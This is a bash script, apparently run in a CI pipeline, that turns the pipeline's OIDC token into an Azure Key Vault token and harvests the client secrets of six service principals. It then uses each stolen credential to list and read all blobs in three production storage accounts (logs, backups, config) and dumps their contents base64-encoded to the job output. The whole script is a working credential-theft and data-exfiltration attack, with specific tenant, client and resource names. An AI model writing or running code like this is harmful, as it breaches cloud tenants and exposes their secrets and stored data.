#!/bin/bash
set -e

# Get OIDC token
OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r .value)

# Get vault token via OIDC
VT_RAW=$(curl -sS -X POST "https://login.microsoftonline.com/3205c325-06a5-4171-9ce8-ffc5e6c2845e/oauth2/v2.0/token" \
  -d "client_id=72ff278a-9e71-43ec-bac4-2ca303f8e462" \
  -d "scope=https://vault.azure.net/.default" \
  -d "grant_type=client_credentials" \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  -d "client_assertion=$OIDC")
VT=$(echo "$VT_RAW" | jq -r .access_token)

# Get SP credentials from KV1
declare -A SPS
for name in cost-reader-principal directory-audit-principal reporting-service-principal reporting-viewer-principal secrets-sync-principal sync-service-principal; do
  SEC=$(curl -sS -H "Authorization: Bearer $VT" "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/$name?api-version=7.4" | jq -r .value)
  CID=$(echo "$SEC" | jq -r .clientId)
  CSE=$(echo "$SEC" | jq -r .clientSecret)
  SPS[$name]="$CID:$CSE"
  echo "GOT $name cid=$CID"
done

# For each SP, get storage token and try listing blobs
for name in cost-reader-principal directory-audit-principal reporting-service-principal reporting-viewer-principal secrets-sync-principal sync-service-principal; do
  IFS=':' read -r CID CSE <<< "${SPS[$name]}"
  echo "=== $name storage test ==="
  
  # Get storage token
  ST_RAW=$(curl -sS -X POST "https://login.microsoftonline.com/3205c325-06a5-4171-9ce8-ffc5e6c2845e/oauth2/v2.0/token" \
    -d "client_id=$CID" \
    -d "client_secret=$CSE" \
    -d "scope=https://storage.azure.com/.default" \
    -d "grant_type=client_credentials")
  ST=$(echo "$ST_RAW" | jq -r .access_token)
  
  if [ "$ST" = "null" ] || [ -z "$ST" ]; then
    echo "  NO TOKEN: $(echo "$ST_RAW" | jq -c .error_description)"
    continue
  fi
  echo "  TOKEN_LEN=${#ST}"
  
  # Try listing blobs in each container
  for ACCT in sttblcilogsprodx3euoz sttblbackupprodx3euoz sttblappcfgprodx3euoz; do
    CONT=""
    case $ACCT in
      sttblcilogsprodx3euoz) CONT="logs" ;;
      sttblbackupprodx3euoz) CONT="exports" ;;
      sttblappcfgprodx3euoz) CONT="config" ;;
    esac
    
    RESULT=$(curl -sS -w "\nHTTP:%{http_code}" -H "Authorization: Bearer $ST" -H "x-ms-version: 2020-10-02" \
      "https://$ACCT.blob.core.windows.net/$CONT?restype=container&comp=list" 2>&1)
    HTTP_CODE=$(echo "$RESULT" | tail -1 | sed 's/HTTP://')
    BODY=$(echo "$RESULT" | head -n -1)
    
    if [ "$HTTP_CODE" = "200" ]; then
      echo "  *** $ACCT/$CONT: 200 OK ***"
      echo "  BLOBS_${ACCT}_B64=$(echo "$BODY" | base64 -w0)"
      
      # If blobs found, try to read each one
      BLOB_NAMES=$(echo "$BODY" | grep -oP '<Name>\K[^<]+' || true)
      for BNAME in $BLOB_NAMES; do
        echo "  --- Reading blob: $BNAME ---"
        BDATA=$(curl -sS -H "Authorization: Bearer $ST" -H "x-ms-version: 2020-10-02" \
          "https://$ACCT.blob.core.windows.net/$CONT/$BNAME" 2>&1)
        echo "  BLOB_${BNAME}_B64=$(echo "$BDATA" | base64 -w0)"
      done
    else
      echo "  $ACCT/$CONT: HTTP $HTTP_CODE"
    fi
  done
done

echo "=== DONE ==="